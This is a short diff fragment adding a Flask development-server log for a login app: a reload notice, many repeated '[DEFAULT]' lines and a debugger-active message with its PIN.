+ * Detected change in '/home/ubuntu/dailylog/Login/app.py', reloading
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+[DEFAULT]
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 210-353-672
